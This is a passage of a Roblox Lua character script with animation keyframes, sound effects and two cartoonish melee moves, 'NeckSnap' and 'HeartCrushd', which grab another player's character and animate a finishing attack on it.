v.Transparency = data.wtr2
v.Attachment.ParticleEmitter.Color = ColorSequence.new(data.wcorecol1,data.wcorecol2)
if data.CoreMat == nil then
else
v.Material = data.CoreMat
end
local tween = RepTween:GetTweenObject(v, transitionInfo, {Color = data.wcorecol2}) tween:Play()
end
end
if data.Unleashed == true then
--Do unleashed finish
--soundeffect(320983830,math.random(7,11)/10,tors,9,0,"bang")
soundeffect(3750937866,math.random(5,9)/10,tors,1,0,"magical bless")
soundeffect(5924381445,0.95,hed,10,0,"HMPH")
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .45
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-25.3),math.rad(4.2),math.rad(-0.1))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1.6,-0.3)*angles(math.rad(-23.3),math.rad(12),math.rad(3.8))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-0.6,-0.8)*angles(math.rad(21.8),math.rad(-4.1),math.rad(8.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.1,-0.3,-1.2)*angles(math.rad(-172.2),math.rad(4.5),math.rad(17.5)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0,-1.2)*angles(math.rad(-168.1),math.rad(-6.7),math.rad(-23.8)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(30.5),math.rad(-0.1),math.rad(-0.5)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
--ModeChangeEnable(false)

delay(.2,function()
CanLoop = true

end)
else
--Don't do unleashed finish
delay(.2,function()
CanLoop = true
end)
end








end

--MOVES
function NeckSnap()
attack = true
hum.WalkSpeed = 0
local targetted = nil
if mouse.Target.Parent ~= Character and mouse.Target.Parent.Parent ~= Character then
if mouse.Target.Parent:FindFirstChild("Humanoid") or mouse.Target.Parent.Parent:FindFirstChild("Humanoid") then
if mouse.Target.Name == "Handle" then --it's a tool or an accessory.
targetted = mouse.Target.Parent.Parent
else
targetted = mouse.Target.Parent

end
else end
end
if targetted ~= nil then
--do move
print("User found! Target is "..targetted.Name)
RootPart.Position = targetted.HumanoidRootPart.Position + Vector3.new(0,0,3)
RootPart.Orientation = targetted.HumanoidRootPart.Orientation
targetted.HumanoidRootPart.Anchored = true
local RootJoint2 = targetted.HumanoidRootPart.RootJoint
local LH2 = targetted.Torso["Left Hip"]
local RH2 = targetted.Torso["Right Hip"]
local LW2 = targetted.Torso["Left Shoulder"]
local RW2 = targetted.Torso["Right Shoulder"]
local TNeck = targetted.Torso.Neck


local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0,0)*angles(math.rad(0),math.rad(-29.5),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(0),math.rad(-4.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0),math.rad(-14.8),math.rad(4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.4,-0.1)*angles(math.rad(-2.6),math.rad(-13.6),math.rad(-10.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,-0.2)*angles(math.rad(-2.6),math.rad(19.6),math.rad(7.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(10.3),math.rad(4.8),math.rad(27.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .3
Animate(RootJoint,cf(-0.1,0,-1)*angles(math.rad(0),math.rad(-1.1),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1.1,0.3)*angles(math.rad(-14.7),math.rad(1),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,-0.1)*angles(math.rad(-9.8),math.rad(-15.2),math.rad(1.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.2,0.8,-1)*angles(math.rad(115.8),math.rad(-3.3),math.rad(17)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.2,0.8,-0.9)*angles(math.rad(118.7),math.rad(-3.6),math.rad(-20.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(7.3),math.rad(-12.9),math.rad(-9.6)),animatetime,easingstyle,easingdir)

-------------------------------------------------------------------------------------------------------------------------------------
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.InOut
local animatetime = .3
Animate(RootJoint2,cf(0,0,0)*angles(math.rad(-3.6),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH2,cf(-1,-1,0)*angles(math.rad(1),math.rad(0),math.rad(-2.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH2,cf(1,-1,0)*angles(math.rad(4),math.rad(0.1),math.rad(1))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW2,cf(-1.5,0.5,0)*angles(math.rad(2.5),math.rad(-0.1),math.rad(-2.1)),animatetime,easingstyle,easingdir)
Animate(RW2,cf(1.5,0.5,0)*angles(math.rad(4.3),math.rad(0.2),math.rad(2.5)),animatetime,easingstyle,easingdir)
Animate(TNeck,necko*angles(math.rad(1.3),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .2
Animate(RootJoint,cf(-0.1,0,-0.8)*angles(math.rad(9.7),math.rad(-1.1),math.rad(0.2))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0.2)*angles(math.rad(-14.7),math.rad(1),math.rad(-3.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1.1,-0.3)*angles(math.rad(-17.2),math.rad(-15.3),math.rad(-0.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,0.1,0.5)*angles(math.rad(115.8),math.rad(-3.3),math.rad(17)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,1.3,-1.9)*angles(math.rad(118.7),math.rad(-3.6),math.rad(11)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(18.8),math.rad(-14.6),math.rad(-6.8)),animatetime,easingstyle,easingdir)
soundeffect(3330223037,1.3,TNeck.Parent,10,0,"ouchie")
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.Out
local animatetime = .25
Animate(RootJoint2,cf(0,0,0)*angles(math.rad(-7.8),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH2,cf(-1,-1.1,0)*angles(math.rad(10.9),math.rad(-0.8),math.rad(-4.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH2,cf(1,-1,0)*angles(math.rad(8.8),math.rad(0.8),math.rad(8.3))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW2,cf(-1.6,0.2,0)*angles(math.rad(9.8),math.rad(-1.5),math.rad(-10.8)),animatetime,easingstyle,easingdir)
Animate(RW2,cf(1.6,0.1,0)*angles(math.rad(12),math.rad(1.3),math.rad(8.1)),animatetime,easingstyle,easingdir)
Animate(TNeck,necko*angles(math.rad(-178.7),math.rad(164.9),math.rad(76.7)),animatetime,Enum.EasingStyle.Back,easingdir) wait(animatetime+.02)


-------------------------------------------------------------------------------------------------------------------------------------
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .2
Animate(RootJoint,cf(-0.1,0,-0.4)*angles(math.rad(4.7),math.rad(-5.3),math.rad(0.3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(-7.6),math.rad(-5.5),math.rad(-4.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(-8),math.rad(-24.5),math.rad(1.3))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.7,0.1,0.5)*angles(math.rad(115.8),math.rad(-3.3),math.rad(17)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.8,-0.8)*angles(math.rad(56.6),math.rad(7.5),math.rad(2.4)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(20.5),math.rad(0.8),math.rad(15.5)),animatetime,easingstyle,easingdir)

local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .15
Animate(RootJoint2,cf(-0.3,-0.1,0)*angles(math.rad(-7.8),math.rad(0),math.rad(23))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH2,cf(-0.8,-0.7,-0.3)*angles(math.rad(10.9),math.rad(-0.8),math.rad(-30.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH2,cf(0.8,-1.4,-0.3)*angles(math.rad(8.8),math.rad(0.8),math.rad(-2.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW2,cf(-1.3,0,-0.5)*angles(math.rad(55.1),math.rad(-54.5),math.rad(51.9)),animatetime,easingstyle,easingdir)
Animate(RW2,cf(1.4,0.4,0)*angles(math.rad(12),math.rad(1.3),math.rad(42.5)),animatetime,easingstyle,easingdir)
Animate(TNeck,necko*angles(math.rad(-173),math.rad(170.4),math.rad(68.9)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint,cf(0,0,-0.1)*angles(math.rad(1.4),math.rad(-8),math.rad(0.1))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.1)*angles(math.rad(-2.9),math.rad(-9.7),math.rad(-4.3))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0.2)*angles(math.rad(-1.6),math.rad(-30.3),math.rad(3.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.6,0.2,0.2)*angles(math.rad(34.5),math.rad(-15.6),math.rad(4.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,-0.3)*angles(math.rad(16.1),math.rad(16.6),math.rad(4.6)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(25.2),math.rad(12.4),math.rad(29.1)),animatetime,easingstyle,easingdir)

local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .1
Animate(RootJoint2,cf(-1.6,-1.8,0.2)*angles(math.rad(-7.8),math.rad(0),math.rad(105.2))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH2,cf(-1.2,-0.5,-0.2)*angles(math.rad(10.9),math.rad(-0.8),math.rad(2.4))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH2,cf(0.3,-0.8,-0.2)*angles(math.rad(45),math.rad(0.2),math.rad(8.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW2,cf(-0.4,0.6,-0.7)*angles(math.rad(131.3),math.rad(-65.3),math.rad(111.5)),animatetime,easingstyle,easingdir)
Animate(RW2,cf(1.4,0,0.2)*angles(math.rad(59.7),math.rad(-27),math.rad(36)),animatetime,easingstyle,easingdir)
Animate(TNeck,necko*angles(math.rad(-171.4),math.rad(171.9),math.rad(64.8)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .3
Animate(RootJoint,cf(0,0,0)*angles(math.rad(0),math.rad(-9.2),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,-0.2)*angles(math.rad(-0.8),math.rad(-11.6),math.rad(-4.2))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0.3)*angles(math.rad(1.5),math.rad(-32.7),math.rad(4.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0,-0.1)*angles(math.rad(-2.6),math.rad(-13.6),math.rad(-3.6)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.1,-0.2)*angles(math.rad(-2.6),math.rad(19.6),math.rad(7.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(33.1),math.rad(21),math.rad(33.5)),animatetime,easingstyle,easingdir)

local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .5
Animate(RootJoint2,cf(-1.8,-2,0.3)*angles(math.rad(-7.8),math.rad(0),math.rad(113.6))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH2,cf(-1.2,-0.5,-0.2)*angles(math.rad(10.9),math.rad(-0.8),math.rad(-30.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH2,cf(0.2,-0.8,-0.2)*angles(math.rad(48.5),math.rad(-1.1),math.rad(-39.5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW2,cf(-0.4,0.6,-0.7)*angles(math.rad(-91.9),math.rad(-61.6),math.rad(-120.6)),animatetime,easingstyle,easingdir)
Animate(RW2,cf(1.2,0.1,-0.5)*angles(math.rad(92.4),math.rad(7.5),math.rad(-76)),animatetime,easingstyle,easingdir)
Animate(TNeck,necko*angles(math.rad(-171.2),math.rad(172),math.rad(64.4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


dmg(targetted)
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .4
Animate(RootJoint,cf(0,0,0)*angles(math.rad(0),math.rad(-29.5),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(0),math.rad(-4.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0),math.rad(-14.8),math.rad(4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.5,0.4,-0.1)*angles(math.rad(-2.6),math.rad(-13.6),math.rad(-10.8)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,-0.2)*angles(math.rad(-2.6),math.rad(19.6),math.rad(7.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(10.3),math.rad(4.8),math.rad(27.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
attack = false


else
--don't do it
attack = false
end
end

function HeartCrushd()
attack = true
hum.WalkSpeed = 0
local targetted = nil
if mouse.Target.Parent ~= Character and mouse.Target.Parent.Parent ~= Character then
if mouse.Target.Parent:FindFirstChild("Humanoid") or mouse.Target.Parent.Parent:FindFirstChild("Humanoid") then
if mouse.Target.Name == "Handle" then --it's a tool or an accessory.
targetted = mouse.Target.Parent.Parent
else
targetted = mouse.Target.Parent

end
else end
end
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .3
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-10.1),math.rad(-38.7),math.rad(-6.3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.3,-1.2,0.4)*angles(math.rad(0),math.rad(50),math.rad(9.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(5.1),math.rad(-22.1),math.rad(13.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.2,0,-0.5)*angles(math.rad(140.4),math.rad(-15.6),math.rad(60.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.4,0)*angles(math.rad(-7.3),math.rad(0),math.rad(11.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(51.5),math.rad(32.9),math.rad(31)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
if targetted ~= nil then
print("User found! Target is "..targetted.Name)
for i = 0,2,0.1 do
RootPart.Position = targetted.HumanoidRootPart.Position + Vector3.new(0,0,3)
RootPart.Orientation = targetted.HumanoidRootPart.Orientation
end
targetted.HumanoidRootPart.Anchored = true
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .4
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-10.1),math.rad(-38.7),math.rad(-6.3))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.3,-1.2,0.4)*angles(math.rad(0),math.rad(50),math.rad(9.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(5.1),math.rad(-22.1),math.rad(13.4))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.1,-0.2,-0.5)*angles(math.rad(140.4),math.rad(-15.6),math.rad(60.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0.3,0)*angles(math.rad(-3),math.rad(0.9),math.rad(11.7)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(45.8),math.rad(29.9),math.rad(34)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
for i = 0,2,0.1 do
RootPart.Position = targetted.HumanoidRootPart.Position + Vector3.new(0,0,3)
RootPart.Orientation = targetted.HumanoidRootPart.Orientation
end
for i = 0,4,0.1 do
swait()
RootPart.Position = targetted.HumanoidRootPart.Position + Vector3.new(0,0,3)
RootPart.Orientation = targetted.HumanoidRootPart.Orientation
local Alpha = .05
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(0),math.rad(43),math.rad(-5.4))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.1,0)*angles(math.rad(3.1),math.rad(17.7),math.rad(-9.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.2,-1,0.2)*angles(math.rad(0),math.rad(-44.5),math.rad(10.1))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.5,1)*angles(math.rad(96.5),math.rad(-27.6),math.rad(0)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(13.2)),Alpha)
end
for i = 0,3,0.1 do
swait()
local Alpha = .1
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0)*angles(math.rad(1.4),math.rad(52.1),math.rad(-6.4))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1.1,0)*angles(math.rad(3.1),math.rad(17.7),math.rad(-9.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1.2,-1,0.2)*angles(math.rad(0),math.rad(-44.5),math.rad(10.1))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-1.4,0.5,1.1)*angles(math.rad(96.5),math.rad(-36.4),math.rad(0)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0.2,0)*angles(math.rad(0),math.rad(0),math.rad(13.2)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(21.3),math.rad(-14),math.rad(-50.7)),Alpha)
end
--grab heart from body
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .6
Animate(RootJoint,cf(0,0,0)*angles(math.rad(-40),math.rad(-83.4),math.rad(-36.5))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-1.1,0.3)*angles(math.rad(19.9),math.rad(64),math.rad(-22))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1.1,-1,0.2)*angles(math.rad(18.4),math.rad(-40.5),math.rad(22.6))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.8,0.5,0)*angles(math.rad(90),math.rad(-6.3),math.rad(-89.9)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.4,0.2,0.2)*angles(math.rad(11.2),math.rad(13.3),math.rad(34)),animatetime,easingstyle,easingdir)

--Other person's animation
if targetted.Humanoid.RigType == Enum.HumanoidRigType.R6 then
Animate(Torso.Neck,necko*angles(math.rad(10),math.rad(0),math.rad(90)),animatetime,easingstyle,easingdir)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .6
Animate(targetted.HumanoidRootPart.RootJoint,cf(0,0,0)*angles(math.rad(6.3),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Left Hip"],cf(-1,-1.2,-0.2)*angles(math.rad(0),math.rad(0),math.rad(-5.1))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Right Hip"],cf(1,-1,-0.1)*angles(math.rad(-18.6),math.rad(0),math.rad(5.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Left Shoulder"],cf(-1.4,0.8,0.2)*angles(math.rad(12.7),math.rad(22.9),math.rad(-37.5)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Right Shoulder"],cf(1.3,0.7,0.3)*angles(math.rad(20.7),math.rad(-35.7),math.rad(33)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Neck"],necko*angles(math.rad(-15.5),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
else
Animate(Torso.Neck,necko*angles(math.rad(10),math.rad(0),math.rad(90)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
end
--Heart is in hand
local Heart = script.Effects.Heart:Clone()
Heart.Anchored = false
Heart.Transparency = 0
Heart.Parent = larm
local HeartWeld = Instance.new("Weld",Heart)
HeartWeld.Part0 = Heart
HeartWeld.Part1 = larm
HeartWeld.C0 = CFrame.new(0,-1,0)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = 1
Animate(RootJoint,cf(0,0,0.5)*angles(math.rad(-9.3),math.rad(-55),math.rad(-6.9))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1,-1,0)*angles(math.rad(0),math.rad(54.7),math.rad(-6.5))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(3.7),math.rad(-32.8),math.rad(6.8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.2,-0.1,0.3)*angles(math.rad(90.1),math.rad(-52.5),math.rad(-56)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.5,0.2,0.1)*angles(math.rad(2.7),math.rad(7.4),math.rad(7)),animatetime,easingstyle,easingdir)





--About to drop heart onto ground

for i = 0,3,0.1 do
local Alpha = .2
RootJoint.C0 = RootJoint.C0:lerp(cf(0,0,0.5)*angles(math.rad(-3.6),math.rad(0.9),math.rad(-3.9))*RootCF,Alpha)
LH.C0 = LH.C0:lerp(cf(-1,-1,0)*angles(math.rad(1.1),math.rad(15.2),math.rad(-4))*angles(math.rad(0),math.rad(-90),math.rad(0)),Alpha)
RH.C0 = RH.C0:lerp(cf(1,-1,0)*angles(math.rad(0),math.rad(-14.7),math.rad(8))*angles(math.rad(0),math.rad(90),math.rad(0)),Alpha)
LW.C0 = LW.C0:lerp(cf(-0.7,0.2,0.6)*angles(math.rad(40.6),math.rad(-44.5),math.rad(-61.2)),Alpha)
RW.C0 = RW.C0:lerp(cf(1.6,0,0.1)*angles(math.rad(2.7),math.rad(7.4),math.rad(14.3)),Alpha)
Torso.Neck.C0 = Torso.Neck.C0:lerp(necko*angles(math.rad(3.9),math.rad(1.5),math.rad(-3.8)),Alpha)
end
--Other person's animation
if targetted.Humanoid.RigType == Enum.HumanoidRigType.R6 then
Animate(Torso.Neck,necko*angles(math.rad(16.8),math.rad(16.1),math.rad(48.6)),animatetime,easingstyle,easingdir)
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .2
Animate(targetted.HumanoidRootPart.RootJoint,cf(0,-0.1,-0.4)*angles(math.rad(-17.1),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Left Hip"],cf(-1,-0.9,-0.2)*angles(math.rad(15.6),math.rad(-1.4),math.rad(-4.9))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Right Hip"],cf(1,-0.9,-0.6)*angles(math.rad(-18.6),math.rad(0),math.rad(5.7))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Left Shoulder"],cf(-1.5,0.7,-0.2)*angles(math.rad(-16.5),math.rad(-3.8),math.rad(-28.8)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Right Shoulder"],cf(1.4,0.7,-0.4)*angles(math.rad(-6.2),math.rad(12.4),math.rad(26.9)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Neck"],necko*angles(math.rad(7.1),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
else
Animate(Torso.Neck,necko*angles(math.rad(16.8),math.rad(16.1),math.rad(48.6)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
end
--Thrown down, about to stomp
HeartWeld:Destroy()
Heart.CanCollide = true
local easingstyle = Enum.EasingStyle.Linear
local easingdir = Enum.EasingDirection.In
local animatetime = .35
Animate(RootJoint,cf(0,0,0.5)*angles(math.rad(0.6),math.rad(0.7),math.rad(-4))*RootCF,animatetime,easingstyle,easingdir)
Animate(LH,cf(-1.1,-0.6,-0.4)*angles(math.rad(-23.6),math.rad(15.5),math.rad(2.6))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(RH,cf(1,-1,0)*angles(math.rad(0.2),math.rad(-14.6),math.rad(8))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(LW,cf(-1.4,0,-0.3)*angles(math.rad(31.2),math.rad(-42.8),math.rad(8.3)),animatetime,easingstyle,easingdir)
Animate(RW,cf(1.6,0,0.1)*angles(math.rad(2.7),math.rad(7.4),math.rad(14.3)),animatetime,easingstyle,easingdir)
Animate(Torso.Neck,necko*angles(math.rad(13.4),math.rad(0.9),math.rad(-4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
--Other person's animation
if targetted.Humanoid.RigType == Enum.HumanoidRigType.R6 then
Animate(Torso.Neck,necko*angles(math.rad(13.4),math.rad(0.9),math.rad(-4)),animatetime,easingstyle,easingdir)
local easingstyle = Enum.EasingStyle.Back
local easingdir = Enum.EasingDirection.Out
local animatetime = .35

Animate(targetted.HumanoidRootPart.RootJoint,cf(0,-1.4,-0.5)*angles(math.rad(-43.7),math.rad(0),math.rad(0))*RootCF,animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Left Hip"],cf(-0.8,0.8,-0.4)*angles(math.rad(45.4),math.rad(3.7),math.rad(-7.7))*angles(math.rad(0),math.rad(-90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Right Hip"],cf(0.9,-0.6,-1.1)*angles(math.rad(-47.7),math.rad(-2.8),math.rad(5))*angles(math.rad(0),math.rad(90),math.rad(0)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Left Shoulder"],cf(-1.6,0.3,-0.6)*angles(math.rad(36.6),math.rad(-25.7),math.rad(-14.1)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Right Shoulder"],cf(1.4,0.4,-0.9)*angles(math.rad(56.7),math.rad(29.4),math.rad(2)),animatetime,easingstyle,easingdir)
Animate(targetted.Torso["Neck"],necko*angles(math.rad(27.4),math.rad(0),math.rad(0)),animatetime,easingstyle,easingdir) wait(animatetime+.02)


else
Animate(Torso.Neck,necko*angles(math.rad(13.4),math.rad(0.9),math.rad(-4)),animatetime,easingstyle,easingdir) wait(animatetime+.02)
end
--just about to stomp
Heart.Anchored = true
Heart.CFrame = RootPart.CFrame*CFrame.new(0,-3,-1)
local easingstyle = Enum.EasingStyle.Sine
local easingdir = Enum.EasingDirection.In
local animatetime = .5
Animate(RootJoint,cf(0,0,0.4)*angles(math.rad(17.6),math.rad(-0.5),math.rad(-4))*RootCF,animatetime,easingstyle,easingdir)
